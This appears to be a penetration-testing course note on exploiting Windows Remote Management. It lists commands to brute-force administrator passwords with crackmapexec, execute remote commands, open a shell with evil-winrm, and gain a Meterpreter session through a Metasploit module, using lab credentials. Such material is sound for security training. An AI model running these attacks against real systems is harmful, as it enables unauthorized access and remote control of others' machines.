---
description: 5985, 5986
---

# 4 - Exploiting WinRM

## **Exploiting WinRM**

* Windows Remote Management (WinRM) is a Windows remote management protocol that can be used to facilitate remote access with Windows systems over HTTP(S).
* Microsoft implemented WinRM in to Windows in order to make life easier for system administrators.
* WinRM is typically used in the following ways:
  * Remotely access and interact with Windows hosts on a local network.
  * Remotely access and execute commands on Windows systems.
  * Manage and configure Windows systems remotely.
* WinRM typically uses TCP port 5985 and 5986 (HTTPS).
* WinRM implements access control and security for communication between systems through various forms of authentication.
* We can utilize a utility called **“crackmapexec”** to perform a brute-force on WinRM in order to identify users and their passwords as well as execute commands on the target system.
* We can also utilize a ruby script called **“evil-winrm”** to obtain a command shell session on the target system.

### Practical Demonstration

`nmap -sV -p 5985 $ip` - scan.

`crackmapexe winrm $ip -u administrator -p /usr/share/metasploit-framework/wordlists/unix_password.txt` - Perform a brute force attack against WinRM.

#### other tools that can perform WinRM bruteforce

* Medusa
* Metasploit

We can now use \[crackmapexec] to execute arbirtary code on the victim system.

`crackmapexec winrm $ip -u administrator -p <password> -x "whoami"` - run a command with legitimate credentials. other cmds like "systeminfo".

or

`crackmapexec winrm 10.4.19.168 -u administrator -p vagrant -x 'powershell.exe -Command whoami /priv'` - spawning powershell and executing the "/priv" cmd.

We can use the \[evil-winrm.rb] script to gain a cmd shell.

`evil-winrm.rb -u administrator -p 'tinkerbell' -i $ip` - Obtain a shell with legitimate credentials.

We can obtain a Meterpreter Session using Metasploit

```
# 
search winrm_script
use exploit/windows/winrm/winrm_script_exec
set RHOSTS $ip
set LHOST and LPORT
set FORCE_VBS true
set USERNAME adminsitrator
set PASSWORD tinkerbell
exploit
# we get a meterpreter session
getuid
sysinfo
```



